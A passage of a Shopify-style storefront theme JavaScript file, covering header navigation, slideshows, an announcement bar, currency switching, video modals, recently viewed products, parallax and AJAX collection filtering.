                    setTimeout(function() {
                        height = 0;
                        setTransitionHeight($module, height, isOpen, isAutoHeight);
                    }, 0);
                }

                if (isOpen && !isAutoHeight) {
                    height = 0;
                }

                $el
                    .attr('aria-expanded', !isOpen)
                    .toggleClass(classes.open, !isOpen);

                setTransitionHeight($module, height, isOpen, isAutoHeight);
            });
        }

        function setTransitionHeight($module, height, isOpen, isAutoHeight) {
            $module
                .removeClass(classes.hide)
                .prepareTransition()
                .css('height', height)
                .toggleClass(classes.open, !isOpen);

            if (!isOpen && isAutoHeight) {
                var o = $module;
                window.setTimeout(function() {
                    o.css('height', 'auto');
                    isTransitioning = false;
                }, 350);
            } else {
                isTransitioning = false;
            }
        }

        return {
            init: init
        };
    })();

    theme.headerNav = (function() {

        var $parent = $(document.documentElement).add('body');
        var $page = $('#MainContent');
        var selectors = {
            wrapper: '.header-wrapper',
            siteHeader: '.site-header',
            searchBtn: '.js-search-header',
            closeSearch: '.js-search-header-close',
            searchContainer: '.site-header__search-container',
            logoContainer: '.site-header__logo',
            logo: '.site-header__logo img',
            navigation: '.site-navigation',
            navContainerWithLogo: '.header-item--logo',
            navItems: '.site-nav__item',
            navLinks: '.site-nav__link',
            navLinksWithDropdown: '.site-nav__link--has-dropdown',
            navDropdownLinks: '.site-nav__dropdown-link--second-level'
        };

        var classes = {
            hasDropdownClass: 'site-nav--has-dropdown',
            hasSubDropdownClass: 'site-nav__deep-dropdown-trigger',
            dropdownActive: 'is-focused'
        };

        var config = {
            namespace: '.siteNav',
            wrapperOverlayed: false,
            overlayedClass: 'is-light',
            stickyEnabled: false,
            stickyActive: false,
            stickyClass: 'site-header--stuck',
            openTransitionClass: 'site-header--opening',
            lastScroll: 0
        };

        // Elements used in resize functions, defined in init
        var $window;
        var $navContainerWithLogo;
        var $logoContainer;
        var $nav;
        var $wrapper;
        var $siteHeader;

        function init() {
            $window = $(window);
            $navContainerWithLogo = $(selectors.navContainerWithLogo);
            $logoContainer = $(selectors.logoContainer);
            $nav = $(selectors.navigation);
            $wrapper = $(selectors.wrapper);
            $siteHeader = $(selectors.siteHeader);

            config.wrapperOverlayed = $wrapper.hasClass(config.overlayedClass);
            config.stickyEnabled = $siteHeader.data('sticky');
            if (config.stickyEnabled) {
                theme.config.stickyHeader = true;
                stickyHeader();
            }

            if (config.wrapperOverlayed) {
                $('body').addClass('overlaid-header');
            }

            accessibleDropdowns();
            searchDrawer();
        }

        function unload() {
            $(window).off(config.namespace);
            $(selectors.searchBtn).off(config.namespace);
            $(selectors.closeSearch).off(config.namespace);
            $parent.off(config.namespace);
            $(selectors.navLinks).off(config.namespace);
            $(selectors.navDropdownLinks).off(config.namespace);
        }

        function searchDrawer() {
            $(selectors.searchBtn).on('click' + config.namespace, function(evt) {
                evt.preventDefault();
                openSearchDrawer();
            });

            $(selectors.closeSearch).on('click' + config.namespace, function() {
                closeSearchDrawer();
            });
        }

        function openSearchDrawer() {
            $(selectors.searchContainer).addClass('is-active');
            $parent.addClass('js-drawer-open js-drawer-open--search');

            slate.a11y.trapFocus({
                $container: $(selectors.searchContainer),
                namespace: 'header_search',
                $elementToFocus: $(selectors.searchContainer).find('input')
            });

            // If sticky is enabled, scroll to top on mobile when close to it
            // so you don't get an invisible search box
            if (theme.config.bpSmall && config.stickyEnabled && config.lastScroll < 300) {
                window.scrollTo(0, 0);
            }

            // Bind events
            slate.a11y.lockMobileScrolling(config.namespace);

            // Clicking out of container closes it
            $page.on('click' + config.namespace, function() {
                closeSearchDrawer();
                return false;
            });

            $parent.on('keyup' + config.namespace, function(evt) {
                if (evt.keyCode === 27) {
                    closeSearchDrawer();
                }
            });
        }

        function closeSearchDrawer() {
            // deselect any focused form elements
            $(document.activeElement).trigger('blur');

            $parent.removeClass('js-drawer-open js-drawer-open--search').off(config.namespace);
            $(selectors.searchContainer).removeClass('is-active');

            slate.a11y.removeTrapFocus({
                $container: $(selectors.searchContainer),
                namespace: 'header_search'
            });

            slate.a11y.unlockMobileScrolling(config.namespace);
            $page.off('click' + config.namespace);
            $parent.off('keyup' + config.namespace);
        }

        function accessibleDropdowns() {
            var hasActiveDropdown = false;
            var hasActiveSubDropdown = false;
            var closeOnClickActive = false;

            // Touch devices open dropdown on first click, navigate to link on second
            if (theme.config.isTouch) {
                $(selectors.navLinksWithDropdown).on('touchend' + config.namespace, function(evt) {
                    var $el = $(this);
                    var $parentItem = $el.parent();
                    if (!$parentItem.hasClass(classes.dropdownActive)) {
                        evt.preventDefault();
                        closeDropdowns();
                        openFirstLevelDropdown($el);
                    } else {
                        window.location.replace($el.attr('href'));
                    }
                });

                $(selectors.navDropdownLinks).on('touchend' + config.namespace, function(evt) {
                    var $el = $(this);
                    var $parentItem = $el.parent();

                    // Open third level menu or go to link based on active state
                    if ($parentItem.hasClass(classes.hasSubDropdownClass)) {
                        if (!$parentItem.hasClass(classes.dropdownActive)) {
                            evt.preventDefault();
                            closeThirdLevelDropdown();
                            openSecondLevelDropdown($el);
                        } else {
                            window.location.replace($el.attr('href'));
                        }
                    } else {
                        // No third level nav, go to link
                        window.location.replace($el.attr('href'));
                    }
                });
            }

            $(selectors.navLinks).on('focusin mouseover' + config.namespace, function() {
                if (hasActiveDropdown) {
                    closeSecondLevelDropdown();
                }

                if (hasActiveSubDropdown) {
                    closeThirdLevelDropdown();
                }

                openFirstLevelDropdown($(this));
            });

            // Force remove focus on sitenav links because focus sometimes gets stuck
            $(selectors.navLinks).on('mouseleave' + config.namespace, function() {
                closeSecondLevelDropdown();
                closeThirdLevelDropdown();
            });

            // Open/hide sub level dropdowns
            $(selectors.navDropdownLinks).on('focusin' + config.namespace, function() {
                if (hasActiveSubDropdown) {
                    closeThirdLevelDropdown();
                }

                openSecondLevelDropdown($(this), true);
            });

            // Private dropdown methods
            function openFirstLevelDropdown($el) {
                var $parentItem = $el.parent();
                if ($parentItem.hasClass(classes.hasDropdownClass)) {
                    $parentItem.addClass(classes.dropdownActive);
                    hasActiveDropdown = true;
                }

                if (!theme.config.isTouch) {
                    if (!closeOnClickActive) {
                        var eventType = theme.config.isTouch ? 'touchend' : 'click';
                        closeOnClickActive = true;
                        $('body').on(eventType + config.namespace, function() {
                            closeDropdowns();
                            $('body').off(config.namespace);
                            closeOnClickActive = false;
                        });
                    }
                }
            }

            function openSecondLevelDropdown($el, skipCheck) {
                var $parentItem = $el.parent();
                if ($parentItem.hasClass(classes.hasSubDropdownClass) || skipCheck) {
                    $parentItem.addClass(classes.dropdownActive);
                    hasActiveSubDropdown = true;
                }
            }

            function closeDropdowns() {
                closeSecondLevelDropdown();
                closeThirdLevelDropdown();
            }

            function closeSecondLevelDropdown() {
                $(selectors.navItems).removeClass(classes.dropdownActive);
            }

            function closeThirdLevelDropdown() {
                $(selectors.navDropdownLinks).parent().removeClass(classes.dropdownActive);
            }
        }

        function stickyHeader() {
            config.lastScroll = 0;
            $siteHeader.wrap('<div class="site-header-sticky"></div>');

            stickyHeaderHeight();
            setTimeout(function() {
                stickyHeaderHeight();
            }, 200)
            $window.on('resize' + config.namespace, $.debounce(50, stickyHeaderHeight));
            $window.on('scroll' + config.namespace, $.throttle(15, stickyHeaderScroll));
        }

        function stickyHeaderHeight() {
            var height = $siteHeader.outerHeight(true);
            var $stickyHeader = $('.site-header-sticky').css('height', height);

            // Also update top position of sticky sidebar
            if ($('.grid__item--sidebar').length) {
                $('.grid__item--sidebar').css('top', height + 10);
            }
        }

        function stickyHeaderScroll() {
            var scroll = $window.scrollTop();
            var threshold = 250;

            if (scroll > threshold) {
                if (config.stickyActive) {
                    return;
                }

                config.stickyActive = true;

                $siteHeader.addClass(config.stickyClass);
                if (config.wrapperOverlayed) {
                    $wrapper.removeClass(config.overlayedClass);
                }

                // Add open transition class after element is set to fixed
                // so CSS animation is applied correctly
                setTimeout(function() {
                    $siteHeader.addClass(config.openTransitionClass);
                }, 100);
            } else {
                if (!config.stickyActive) {
                    return;
                }

                config.stickyActive = false;

                $siteHeader.removeClass(config.openTransitionClass).removeClass(config.stickyClass);
                if (config.wrapperOverlayed) {
                    $wrapper.addClass(config.overlayedClass);
                }
            }

            config.lastScroll = scroll;
        }

        return {
            init: init,
            unload: unload
        };
    })();

    theme.Slideshow = (function() {
        this.$slideshow = null;

        var classes = {
            next: 'is-next',
            init: 'is-init',
            animateOut: 'animate-out',
            wrapper: 'slideshow-wrapper',
            slideshow: 'slideshow',
            allSlides: 'slick-slide',
            currentSlide: 'slick-current',
            pauseButton: 'slideshow__pause',
            isPaused: 'is-paused'
        };

        function slideshow(el, args) {
            this.$slideshow = $(el);
            this.$wrapper = this.$slideshow.closest('.' + classes.wrapper);
            this.$pause = this.$wrapper.find('.' + classes.pauseButton);

            this.settings = {
                accessibility: true,
                arrows: args.arrows ? true : false,
                dots: args.dots ? true : false,
                fade: args.fade ? true : false,
                speed: args.speed ? args.speed : 500,
                draggable: true,
                touchThreshold: 5,
                pauseOnHover: false,
                autoplay: args.autoplay ? true : false,
                autoplaySpeed: this.$slideshow.data('speed')
            };
          
          
               //google review settings	
          	
        
            if(this.$slideshow[0].dataset.review) {	
              this.newarg = this.$slideshow[0].dataset;	
              this.settings = {	
                accessibility: true,	
                arrows: false,	
                dots: args.dots ? true : false,	
                speed: 500,	
                draggable: true,	
                touchThreshold: 5,	
                pauseOnHover: false,	
                infinite: true,	
                slidesToShow: 3,	
                slidesToScroll: 3,	
                autoplay: args.autoplay ? true : false,	
                autoplaySpeed: this.$slideshow.data('speed'),	
                 responsive: [	
                      {	
                       breakpoint: 600,	
                       settings: {	
                       slidesToShow: 1,	
                       slidesToScroll: 1,	
                       }	
                     }	
                ]	
            };	
             if(this.$slideshow[0].id.includes("product")) {	
               this.settings.slidesToScroll = 1;
               this.settings.slidesToShow = 1;
             }
            } 	
          
            //google review settings	
            if(this.$slideshow[0].dataset.slidetext) {	
              this.newarg = this.$slideshow[0].dataset;	
              this.settings = {	
                accessibility: true,	
                arrows: false,	
                dots: args.dots ? true : false,	
                speed: 500,	
                draggable: true,	
                touchThreshold: 5,	
                pauseOnHover: false,	
                infinite: true,	
                slidesToShow: 1,	
                slidesToScroll: 1,	
                autoplay: args.autoplay ? true : false,	
                autoplaySpeed: this.$slideshow.data('speed'),	
                 responsive: [	
                      {	
                       breakpoint: 600,	
                       settings: {	
                       slidesToShow: 1,	
                       slidesToScroll: 1,	
                       }	
                     }	
                ]	
            };	
             if(this.$slideshow[0].id.includes("product")) {	
               this.settings.slidesToScroll = 1;
               this.settings.slidesToShow = 1;
             }
            } 	
          	
          
          
          

            this.$slideshow.off('beforeChange');
            this.$slideshow.off('afterSlideChange');
            this.$slideshow.on('init', this.init.bind(this));
            this.$slideshow.on('beforeChange', this.beforeSlideChange.bind(this));
            this.$slideshow.on('afterChange', this.afterSlideChange.bind(this));

            this.$slideshow.slick(this.settings);

            this.$pause.on('click', this._togglePause.bind(this));
        }

        slideshow.prototype = $.extend({}, slideshow.prototype, {
            init: function(event, obj) {
                this.$slideshowList = obj.$list;
                this.$slickDots = obj.$dots;
                this.$allSlides = obj.$slides;
                this.slideCount = obj.slideCount;

                this.$slideshow.addClass(classes.init);
                this._a11y();
                this._clonedLazyloading();
            },
            beforeSlideChange: function(event, slick, currentSlide, nextSlide) {
                var $slider = slick.$slider;
                var $currentSlide = $slider.find('.' + classes.currentSlide).addClass(classes.animateOut);
            },
            afterSlideChange: function(event, slick, currentSlide) {
                var $slider = slick.$slider;
                var $allSlides = $slider.find('.' + classes.allSlides).removeClass(classes.animateOut);
            },
            destroy: function() {
                this.$slideshow.slick('unslick');
            },

            // Playback
            _play: function() {
                this.$slideshow.slick('slickPause');
                $(classes.pauseButton).addClass('is-paused');
            },
            _pause: function() {
                this.$slideshow.slick('slickPlay');
                $(classes.pauseButton).removeClass('is-paused');
            },
            _togglePause: function() {
                var slideshowSelector = this._getSlideshowId(this.$pause);
                if (this.$pause.hasClass(classes.isPaused)) {
                    this.$pause.removeClass(classes.isPaused);
                    $(slideshowSelector).slick('slickPlay');
                } else {
                    this.$pause.addClass(classes.isPaused);
                    $(slideshowSelector).slick('slickPause');
                }
            },

            // Helpers
            _getSlideshowId: function($el) {
                return '#Slideshow-' + $el.data('id');
            },
            _activeSlide: function() {
                return this.$slideshow.find('.slick-active');
            },
            _currentSlide: function() {
                return this.$slideshow.find('.slick-current');
            },
            _nextSlide: function(index) {
                return this.$slideshow.find('.slideshow__slide[data-slick-index="' + index + '"]');
            },

            // a11y fixes
            _a11y: function() {
                var $list = this.$slideshowList;
                var autoplay = this.settings.autoplay;

                if (!$list) {
                    return;
                }

                // Remove default Slick aria-live attr until slider is focused
                $list.removeAttr('aria-live');

                // When an element in the slider is focused
                // pause slideshow and set aria-live
                $(classes.wrapper).on('focusin', function(evt) {
                    if (!$(classes.wrapper).has(evt.target).length) {
                        return;
                    }

                    $list.attr('aria-live', 'polite');
                    if (autoplay) {
                        this._pause();
                    }
                }.bind(this));

                // Resume autoplay
                $(classes.wrapper).on('focusout', function(evt) {
                    if (!$(classes.wrapper).has(evt.target).length) {
                        return;
                    }

                    $list.removeAttr('aria-live');
                    if (autoplay) {
                        this._play();
                    }
                }.bind(this));
            },

            // Make sure lazyloading works on cloned slides
            _clonedLazyloading: function() {
                var $slideshow = this.$slideshow;

                $slideshow.find('.slick-slide').each(function(index, el) {
                    var $slide = $(el);
                    if ($slide.hasClass('slick-cloned')) {
                        var slideId = $slide.data('id');
                        var $slideImg = $slide.find('.hero__image').removeClass('lazyloading').addClass('lazyloaded');

                        // Get inline style attribute from non-cloned slide with arbitrary timeout
                        // so the image is loaded
                        setTimeout(function() {
                            var loadedImageStyle = $slideshow.find('.slideshow__slide--' + slideId + ':not(.slick-cloned) .hero__image').attr('style');

                            if (loadedImageStyle) {
                                $slideImg.attr('style', loadedImageStyle);
                            }

                        }, this.settings.autoplaySpeed / 1.5);

                    }
                }.bind(this));
            }
        });

        return slideshow;
    })();

    theme.announcementBar = (function() {
        var slideCount = 0;
        var compact = false;
        var defaults = {
            accessibility: true,
            arrows: false,
            dots: false,
            autoplay: true,
            autoplaySpeed: 5000,
            touchThreshold: 20,
            slidesToShow: 1
        };
        var $slider;

        function init() {
            $slider = $('#AnnouncementSlider');
            if (!$slider.length) {
                return;
            }

            slideCount = $slider.data('block-count');
            compact = $slider.data('compact-style');

            var desktopOptions = $.extend({}, defaults, {
                slidesToShow: compact ? 1 : slideCount,
                slidesToScroll: 1
            });

            var mobileOptions = $.extend({}, defaults, {
                slidesToShow: 1
            });

            if (theme.config.bpSmall) {
                initSlider($slider, mobileOptions);
            } else {
                initSlider($slider, desktopOptions);
            }

            $('body').on('matchSmall', function() {
                initSlider($slider, mobileOptions);
            }.bind(this));

            $('body').on('matchLarge', function() {
                initSlider($slider, desktopOptions);
            }.bind(this));
        }

        function initSlider($slider, args) {
            if (isInitialized($slider)) {
                $slider.slick('unslick');
            }
            $slider.slick(args);
        }

        function isInitialized($slider) {
            return $slider.length && $slider.hasClass('slick-initialized');
        }

        // Go to slide if selected in the editor
        function onBlockSelect(id) {
            var $slide = $('#AnnouncementSlide-' + id);
            if ($slider.length) {
                $slider.slick('slickPause');
            }
            if ($slide.length) {
                $slider.slick('slickGoTo', $slide.data('index'));
            }
        }

        function onBlockDeselect(id) {
            if ($slider.length && isInitialized($slider)) {
                $slider.slick('slickPlay');
            }
        }

        function unload() {
            if (isInitialized($slider)) {
                $slider.slick('unslick');
            }
        }

        return {
            init: init,
            onBlockSelect: onBlockSelect,
            onBlockDeselect: onBlockDeselect,
            unload: unload
        };
    })();

    theme.currencySwitcher = (function() {

        var selectors = {
            dataDiv: '#CurrencyData',
            picker: '.currency-input'
        };

        var data = {};

        function init() {
            var $dataDiv = $(selectors.dataDiv);

            if (!$dataDiv.length) {
                return;
            }

            $primaryPicker = $('#CurrencyPicker-header');
            $drawerPicker = $('#CurrencyPicker-drawer');

            // Keep all currency pickers in sync
            $primaryPicker.on('change', function() {
                $drawerPicker.val($(this).val());
            });

            $drawerPicker.on('change', function() {
                $primaryPicker.val($(this).val());
            });

            data = {
                currency: $dataDiv.data('shop-currency'),
                default: $dataDiv.data('default-currency'),
                format: $dataDiv.data('format'),
                moneyFormat: $dataDiv.data('money-format'),
                moneyCurrencyFormat: $dataDiv.data('money-currency-format')
            };

            Currency.format = data.format;

            // Rely on the shop's currency format, not Shopify defaults (in case merchant changes it)
            Currency.money_format[data.currency] = data.moneyFormat;
            Currency.money_with_currency_format[data.currency] = data.moneyCurrencyFormat;

            // Fix for customer account page
            $('span.money span.money').each(function() {
                $(this).parents('span.money').removeClass('money');
            });

            // Save current price
            $('span.money').each(function() {
                $(this).attr('data-currency-' + data.currency, $(this).html());
            });

            checkCookie();

            $(selectors.picker).val(Currency.currentCurrency).on('change', refresh);
        }

        function refresh() {
            var newCurrency = $(selectors.picker).val();
            Currency.convertAll(Currency.currentCurrency, newCurrency);
        }

        function ajaxrefresh() {
            var newCurrency = $(selectors.picker).val();
            // Ajax cart always returns shop's currency, not what theme settings defines
            Currency.convertAll(data.currency, newCurrency);
        }

        function checkCookie() {
            var cookieCurrency = Currency.cookie.read();

            if (cookieCurrency == null) {
                if (data.currency !== data.default) {
                    Currency.convertAll(data.currency, data.default);
                } else {
                    Currency.currentCurrency = data.default;
                }
            } else if ($(selectors.picker).length && $(selectors.picker).find('option[value=' + cookieCurrency + ']').length === 0) {
                // If the cookie value does not correspond to any value in the currency dropdown
                Currency.currentCurrency = data.currency;
                Currency.cookie.write(data.currency);
            } else if (cookieCurrency === data.currency) {
                Currency.currentCurrency = data.currency;
            } else {
                Currency.convertAll(data.currency, cookieCurrency);
            }
        }

        return {
            init: init,
            refresh: refresh,
            ajaxrefresh: ajaxrefresh
        };
    })();

    theme.initQuickShop = function(reinit) {
        var ids = [];
        var $buttons = $('.quick-product__btn');

        $buttons.each(function() {
            var id = $(this).data('product-id');
            var modalId = 'QuickShopModal-' + id;
            var name = 'quick-modal-' + id;

            // If another identical modal exists, remove duplicates
            if (ids.indexOf(id) > -1) {
                $('.modal--quick-shop[data-product-id="' + id + '"]').each(function(i) {
                    if (i > 0) {
                        $(this).remove();
                    }
                });
                return;
            }

            new theme.Modals(modalId, name);
            ids.push(id);
        });
    };

    theme.videoModal = function() {
        var videoModalPlayer = null;
        var videoOptions = {
            width: 1280,
            height: 720,
            playerVars: {
                autohide: 0,
                autoplay: 1,
                branding: 0,
                cc_load_policy: 0,
                fs: 0,
                iv_load_policy: 3,
                modestbranding: 1,
                playsinline: 1,
                quality: 'hd720',
                rel: 0,
                showinfo: 0,
                wmode: 'opaque'
            }
        };

        var selectors = {
            triggers: 'a[href*="youtube.com/watch"], a[href*="youtu.be/"]'
        };

        if (!$(selectors.triggers).length) {
            return;
        }

        var modal = new theme.Modals('VideoModal', 'video-modal', {
            closeOffContentClick: true,
            solid: true
        });

        $(selectors.triggers).on('click', triggerYouTubeModal);

        function triggerYouTubeModal(evt) {
            evt.preventDefault();
            window.loadYouTube();

            if (theme.config.youTubeReady) {
                startVideoOnClick(evt);
            } else {
                $('body').on('youTubeReady', function() {
                    startVideoOnClick(evt);
                });
            }
        }

        function startVideoOnClick(evt) {
            var $el = $(evt.currentTarget);
            var videoId = getYoutubeVideoId($el.attr('href'));

            var args = $.extend({}, videoOptions, {
                videoId: videoId
            });

            // Disable plays inline on mobile
            args.playerVars.playsinline = theme.config.bpSmall ? 0 : 1;

            var videoModalPlayer = new YT.Player('VideoHolder', args);
            modal.open();

            $('body').on('modalClose.VideoModal', function() {
                // Slight timeout so it is destroyed after the modal closes
                setTimeout(function() {
                    videoModalPlayer.destroy();
                }, 500); // modal close css transition
            });
        }

        function getYoutubeVideoId(url) {
            var regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#\&\?]*).*/;
            var match = url.match(regExp);
            return (match && match[7].length == 11) ? match[7] : false;
        }
    };


    theme.RecentlyViewed = (function() {
        var selectors = {
            template: '#RecentlyViewedProduct',
            outputContainer: '#RecentlyViewed-'
        };

        var init = false;

        function RecentlyViewed(container) {
            var $container = this.$container = $(container);
            var sectionId = this.sectionId = $container.attr('data-section-id');
            this.namespace = '.recently-viewed' + sectionId;

            if (!$(selectors.template).length) {
                return;
            }

            // Lazyload API
            this.checkVisibility();
            $(window).on('scroll' + this.namespace, $.throttle(200, this.checkVisibility.bind(this)));
        };

        RecentlyViewed.prototype = $.extend({}, RecentlyViewed.prototype, {
            init: function() {
                if (init) {
                    return;
                }

                init = true;

                if ($.isEmptyObject(theme.recentlyViewed.recent)) {
                    // No previous history on page load, so bail
                    return;
                }

                this.outputContainer = $(selectors.outputContainer + this.sectionId);
                this.handle = this.$container.attr('data-product-handle');

                // Request new product info via JS API
                var promises = [];
                for (handle in theme.recentlyViewed.recent) {
                    promises.push(this.getProductInfo(handle));
                }

                Promise.all(promises).then(function(result) {
                    this.setupOutput(result);
                    this.captureProductDetails(result);
                }.bind(this), function(error) {
                    console.log('Theme | recently viewed products failed to load');
                    console.log(error);
                });
            },

            checkVisibility: function() {
                if (theme.isElementVisible(this.$container, 600)) {
                    this.init();
                    $(window).off('scroll' + this.namespace);
                }
            },

            getProductInfo: function(handle) {
                return new Promise(function(resolve, reject) {
                    if (theme.recentlyViewed.productInfo.hasOwnProperty(handle)) {
                        resolve(theme.recentlyViewed.productInfo[handle]);
                    } else {
                        jQuery.getJSON('/products/' + handle + '.js', function(product) {
                            resolve(product);
                        });
                    }
                });
            },

            setupOutput: function(products) {
                var allProducts = [];
                var data = {};
                var limit = this.$container.attr('data-recent-count');

                var i = 0;
                for (key in products) {
                    var product = products[key];
                    // Ignore current product
                    if (product.handle === this.handle) {
                        continue;
                    }

                    i++;

                    // New or formatted properties
                    product.url_formatted = theme.recentlyViewed.recent[product.handle] ? theme.recentlyViewed.recent[product.handle].url : product.url;
                    product.image_responsive_url = theme.recentlyViewed.recent[product.handle].featuredImage;
                    product.image_aspect_ratio = theme.recentlyViewed.recent[product.handle].aspectRatio;
                    product.on_sale = product.compare_at_price > product.price;
                    product.sold_out = !product.available;
                    product.price_formatted = theme.Currency.formatMoney(product.price, theme.settings.moneyFormat);
                    product.compare_at_price_formatted = theme.Currency.formatMoney(product.compare_at_price, theme.settings.moneyFormat);
                    product.price_min_formatted = theme.Currency.formatMoney(product.price_min, theme.settings.moneyFormat);
                    product.money_saved = theme.Currency.formatMoney((product.compare_at_price - product.price), theme.settings.moneyFormat);

                    allProducts.unshift(product);
                }

                data = {
                    items: allProducts.slice(0, limit),
                    grid_item_width: this.$container.attr('data-grid-item-class')
                };

                if (allProducts.length === 0) {
                    return;
                }

                // Prep handlebars template
                var source = $(selectors.template).html();
                var template = Handlebars.compile(source);
                this.outputContainer.append(template(data));

                if (AOS) {
                    AOS.refreshHard();
                }
            },

            captureProductDetails: function(products) {
                for (var i = 0; i < products.length; i++) {
                    var product = products[i];
                    theme.recentlyViewed.productInfo[product.handle] = product;
                }

                // Add data to session storage to reduce API requests later
                if (theme.config.hasSessionStorage) {
                    sessionStorage.setItem('recent-products', JSON.stringify(theme.recentlyViewed.productInfo));
                }
            },

            onUnload: function() {
                init = false;
                $('window').off(this.namespace);
            }
        });

        return RecentlyViewed;
    })();

    theme.parallaxSections = {};

    theme.Parallax = (function() {
        var speed = 7; // higher is slower

        function parallax(el, args) {
            this.$container = $(el);
            this.namespace = args.namespace;

            if (!this.$container.length) {
                return;
            }

            if (args.desktopOnly) {
                this.desktopInit();
            } else {
                this.init(this.$container, args)
            }
        }

        parallax.prototype = $.extend({}, parallax.prototype, {
            init: function(desktopOnly) {
                var $window = this.$window = $(window);
                var elTop = this.$container.offset().top;

                $window.on('scroll' + this.namespace, function(evt) {
                    var scrolled = $window.scrollTop();
                    var shiftDistance = (elTop - scrolled) / speed;
                    this.$container.css({
                        'transform': 'translate3d(0, ' + shiftDistance + 'px, 0)'
                    });
                }.bind(this));

                // Reinit on resize
                $window.on('resize' + this.namespace, $.debounce(350, function() {
                    $window.off(this.namespace);

                    if (desktopOnly) {
                        if (!theme.config.bpSmall) {
                            this.init(true);
                            return;
                        }
                    }

                    this.init();
                }.bind(this)));
            },

            desktopInit: function() {
                if (!theme.config.bpSmall) {
                    this.init(true);
                }

                $('body').on('matchSmall', function() {
                    this.destroy();
                }.bind(this));

                $('body').on('matchLarge', function() {
                    this.init(true);
                }.bind(this));
            },

            destroy: function() {
                this.$container.removeAttr('style');
                this.$window.off(this.namespace);
            }
        });

        return parallax;
    })();
  


    theme.collectionTemplate = (function() {
        var isAnimating = false;

        var selectors = {
            collectionGrid: '.grid--collection',
            sidebar: '#CollectionSidebar',
            tags: '.tag-list a',
            removeTag: '.tag--remove a'
        };

        var settings = {
            combineTags: $(selectors.sidebar).data('combine-tags')
        };

        var classes = {
            activeTag: 'tag--active'
        };

        function init() {
            // Ajax pagination
            $(window).on('popstate', function(state) {
                if (state) {
                    getNewCollectionContent(location.href);
                }
            });

            initTagClicks();
        }

        function initTagClicks() {
            $('body').on('click', selectors.tags, function(evt) {
                if (theme.FilterDrawer) {
                    theme.FilterDrawer.close();
                }

                if ($(this).hasClass('no-ajax')) {
                    return;
                }

                evt.preventDefault();
                if (isAnimating) {
                    return;
                }

                isAnimating = true;

                var $el = $(evt.currentTarget);
                var $parent = $el.parent();
                var newUrl = $el.attr('href');

                if (settings.combineTags) {
                    if ($parent.hasClass(classes.activeTag)) {
                        $parent.removeClass(classes.activeTag);
                    } else {
                        $parent.addClass(classes.activeTag);
                    }
                } else {
                    $(selectors.tags).parent().removeClass(classes.activeTag);
                    $parent.addClass(classes.activeTag);
                }

                updateScroll(true);

                history.pushState({}, '', newUrl);
                $(selectors.collectionGrid).addClass('unload');
                getNewCollectionContent(newUrl);
            });

            // Immediately remove the remove tag button before ajax kicks in
            $('body').on('click', selectors.removeTag, function() {
                $(this).parent('li').remove();
            });
        }

        function updateScroll(animate) {
            var scrollTo;
            if (theme.config.bpSmall) {
                scrollTo = $('.collection-filter').offset().top - 10;
            } else {
                scrollTo = $('#CollectionAjaxResult').offset().top + 1;
            }

            if (theme.config.stickyHeader) {
                var heightOfStickyNav = $('.site-header').outerHeight(true);
                scrollTo = scrollTo - heightOfStickyNav;
            }

            if (animate) {
                $('html, body').animate({
                    scrollTop: scrollTo
                }, 300);
            } else {
                $('html, body').scrollTop(scrollTo);
            }
        }

        function getNewCollectionContent(url) {
            url = url + '?view=ajax';
            $('#CollectionAjaxResult').load(url + ' #CollectionAjaxContent', function() {
                isAnimating = false;
                theme.reinitSection('collection-template');
                theme.collectionTemplate.reinit();
            }.bind(this));
        }

        function reinit() {
            settings.combineTags = $(selectors.sidebar).data('combine-tags');

            updateScroll(false);
            initTagClicks();

            AOS.refreshHard();

            // Setup page transition classes
            theme.pageTransitions();

            // Reload quick shop buttons
            theme.initQuickShop(true);

            // Refresh currency
            if ($('body').hasClass('currencies-enabled')) {
                theme.currencySwitcher.ajaxrefresh();
            }

            // Refresh reviews app
            if (window.SPR) {
                SPR.initDomEls();
                SPR.loadBadges();
            }

            // Trigger resize for sticky sidebar styles to update
            $('body').trigger('resize');

            // Reload products inside each quick shop
            sections.register('product-template', theme.Product);
        }

        return {
            init: init,
            reinit: reinit
        };
    })();

    theme.customerTemplates = (function() {

        function initEventListeners() {
            // Show reset password form
            $('#RecoverPassword').on('click', function(evt) {
                evt.preventDefault();
                toggleRecoverPasswordForm();
            });

            // Hide reset password form
            $('#HideRecoverPasswordLink').on('click', function(evt) {
                evt.preventDefault();
                toggleRecoverPasswordForm();
            });
        }

        /**
         *
         *  Show/Hide recover password form
         *
         */
        function toggleRecoverPasswordForm() {
            $('#RecoverPasswordForm').toggleClass('hide');
            $('#CustomerLoginForm').toggleClass('hide');
        }

        /**
         *
         *  Show reset password success message
         *
         */
        function resetPasswordSuccess() {
            var $formState = $('.reset-password-success');

            // check if reset password form was successfully submitted
            if (!$formState.length) {
                return;
            }

            // show success message
            $('#ResetSuccess').removeClass('hide');
        }

        /**
         *
         *  Show/hide customer address forms
         *
         */
        function customerAddressForm() {
            var $newAddressForm = $('#AddressNewForm');
            var $addressForms = $('.js-address-form');

            if (!$newAddressForm.length || !$addressForms.length) {
                return;
            }

            if (Shopify) {
                $('.js-address-country').each(function() {
                    var $container = $(this);
                    var countryId = $container.data('country-id');
                    var provinceId = $container.data('province-id');
                    var provinceContainerId = $container.data('province-container-id');

                    new Shopify.CountryProvinceSelector(
                        countryId,
                        provinceId, {
                            hideElement: provinceContainerId
                        }
                    );
                });
            }

            // Toggle new/edit address forms
            $('.address-new-toggle').on('click', function() {
                $newAddressForm.toggleClass('hide');
            });

            $('.address-edit-toggle').on('click', function() {
                var formId = $(this).data('form-id');
                $('#EditAddress_' + formId).toggleClass('hide');
            });

            $('.address-delete').on('click', function() {
                var $el = $(this);
                var formId = $el.data('form-id');
                var confirmMessage = $el.data('confirm-message');

                if (confirm(confirmMessage || 'Are you sure you wish to delete this address?')) {
                    Shopify.postLink('/account/addresses/' + formId, {
                        parameters: {
                            _method: 'delete'
                        }
                    });
                }
            });
        }

        /**
         *
         *  Check URL for reset password hash
         *
         */
        function checkUrlHash() {
            var hash = window.location.hash;

            // Allow deep linking to recover password form
            if (hash === '#recover') {
                toggleRecoverPasswordForm();
            }
        }

        return {
            init: function() {
                checkUrlHash();
                initEventListeners();
                resetPasswordSuccess();
                customerAddressForm();
            }
        };
    })();


    theme.Product = (function() {

        var classes = {
            onSale: 'on-sale',
            disabled: 'disabled',
            isModal: 'is-modal',
            loading: 'loading',
            loaded: 'loaded',
            interactable: 'video-interactable'
        };

        var selectors = {
            productVideo: '.product__video',
            videoParent: '.product__video-wrapper',
            currentSlide: '.slick-current',
